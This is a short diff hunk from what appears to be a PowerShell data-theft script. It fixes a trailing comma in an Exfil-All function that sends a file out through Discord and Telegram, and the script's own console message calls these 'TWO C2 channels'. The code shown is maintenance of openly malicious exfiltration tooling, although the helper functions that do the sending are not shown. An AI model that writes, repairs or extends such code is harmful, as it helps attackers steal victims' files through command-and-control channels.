@@ -252,7 +252,7 @@ function Exfil-All {
     
     $methods = @(
         @{Name="Discord"; Function={Exfil-Discord $FilePath}},
-        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}},
+        @{Name="Telegram"; Function={Exfil-Telegram $FilePath}}
     )
     $success = 0
     Write-Host "📤 Exfiltrating to TWO C2 channels..." -ForegroundColor Yellow
